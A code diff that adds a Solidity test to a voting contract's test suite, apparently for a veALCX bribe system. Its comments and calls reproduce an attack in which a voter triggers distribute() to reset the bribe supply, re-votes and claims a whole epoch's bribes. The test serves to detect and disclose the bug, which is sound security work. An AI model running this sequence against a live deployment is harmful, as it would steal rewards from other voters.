@@ -879,6 +879,62 @@ contract VotingTest is BaseTest {
         voter.claimBribes(bribes, tokens, tokenId1);
     }
 
+    function testBugVotingSupply() public {
+        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
+        uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);
+        address bribeAddress = voter.bribes(address(sushiGauge));
+
+        // Add BAL bribes to sushiGauge
+        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
+
+        address[] memory pools = new address[](1);
+        pools[0] = sushiPoolAddress;
+        uint256[] memory weights = new uint256[](1);
+        weights[0] = 5000;
+
+        address[] memory bribes = new address[](1);
+        bribes[0] = address(bribeAddress);
+        address[][] memory tokens = new address[][](1);
+        tokens[0] = new address[](1);
+        tokens[0][0] = bal;
+
+        // in epoch i, attacker votes with balance x
+        hevm.prank(admin);
+        voter.vote(tokenId1, pools, weights, 0);
+
+        hevm.prank(beef);
+        voter.vote(tokenId2, pools, weights, 0);
+
+        // ------------------- Start second epoch i+1
+        hevm.warp(newEpoch());
+        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
+
+        // attacker calls Voter.distribute(), which triggers Bribe.resetVoting(), therefore setting totalVoting = 0.
+        // the attacker votes again with balance x which triggers a new supply checkpoint which includes only attacker's vote x
+        // Attacker calls Bribe.getRewardForOwner() which sends all rewards of an epoch to the attacker.
+        hevm.startPrank(admin);
+        voter.distribute();
+        voter.vote(tokenId1, pools, weights, 0);
+        voter.claimBribes(bribes, tokens, tokenId1);
+        hevm.stopPrank();
+
+        // If this attack is successful then an additional voter should not be able to claim bribes
+        // Additional voter votes
+        hevm.prank(beef);
+        voter.vote(tokenId2, pools, weights, 0);
+
+        hevm.warp(newEpoch());
+        voter.distribute();
+
+        hevm.prank(admin);
+        voter.claimBribes(bribes, tokens, tokenId1);
+        hevm.prank(beef);
+        voter.claimBribes(bribes, tokens, tokenId2);
+
+        // This test failing indicates that the attack was successful
+        assertEq(IERC20(bal).balanceOf(admin), IERC20(bal).balanceOf(beef), "earned bribes are not equal");
+    }
+
     // Voting power should be dependent on epoch at which vote is cast
     function testVotingPower() public {
         uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
